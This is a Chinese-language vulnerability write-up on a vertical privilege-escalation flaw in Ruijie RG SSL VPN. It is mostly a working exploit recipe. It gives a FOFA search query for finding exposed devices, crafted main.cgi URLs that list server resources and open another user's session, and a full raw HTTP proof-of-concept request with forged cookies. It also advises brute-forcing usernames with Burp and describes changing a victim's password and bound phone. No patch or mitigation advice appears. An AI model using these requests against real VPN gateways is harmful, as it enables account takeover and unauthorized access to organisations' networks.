# 锐捷RG SSL VPN 垂直越权漏洞

**一、漏洞简介**

Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源

**二、影响版本**  
锐捷RG SSL VPN  
**三、资产测绘**

fofa`icon_hash="884334722" || title="Ruijie SSL VPN"`  
●登录页面![1716003142340-e37abdfb-2331-46bd-9184-8f06ccc163f8.png](./img/rnV_dT0P-F2gQ0uU/1716003142340-e37abdfb-2331-46bd-9184-8f06ccc163f8-202983.png)

  
**四、漏洞复现**

```plain
/cgi-bin/main.cgi?oper=getrsc
```

直接访问，回显如下：

![1716002869509-8022ac2f-2774-470e-a9a5-c0a6eddcb6e4.png](./img/rnV_dT0P-F2gQ0uU/1716002869509-8022ac2f-2774-470e-a9a5-c0a6eddcb6e4-567977.png)

随后访问如下，UserName 参数为已知用户名 在未知登录用户名的情况下 漏洞无法利用(根据请求包使用Burp进行用户名爆破)

```plain
/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=name&sid=1614345312&oper=showres
```

![1716003540683-111e6aa4-2326-44c7-bfaf-ac707445a34b.png](./img/rnV_dT0P-F2gQ0uU/1716003540683-111e6aa4-2326-44c7-bfaf-ac707445a34b-026112.png)

<font style="color:rgb(0, 0, 0);">查看服务器资源</font><font style="color:rgba(0, 0, 0, 0.9);">POC：</font>

```plain
GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1
Host: 127.0.0.1
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UserName=name; SessionId=1; FirstVist=1; Skin=1; tunnel=1
```

![1716003718786-1772a9c9-e1e3-4d28-b214-4a3f675b8f85.png](./img/rnV_dT0P-F2gQ0uU/1716003718786-1772a9c9-e1e3-4d28-b214-4a3f675b8f85-584396.png)

通过此方法知道用户名后可以通过漏洞修改账号参数，访问

```plain
/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres
```

![1716003925237-08d888f1-6d4f-4ff1-b393-80e22421595c.png](./img/rnV_dT0P-F2gQ0uU/1716003925237-08d888f1-6d4f-4ff1-b393-80e22421595c-256764.png)

点击个人设置跳转页面即可修改账号信息

![1716003942414-7766703a-9795-4795-8397-40b3ed33cfa1.png](./img/rnV_dT0P-F2gQ0uU/1716003942414-7766703a-9795-4795-8397-40b3ed33cfa1-770431.png)



> 更新: 2024-06-24 11:42:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tmgs3g967ixmiwam>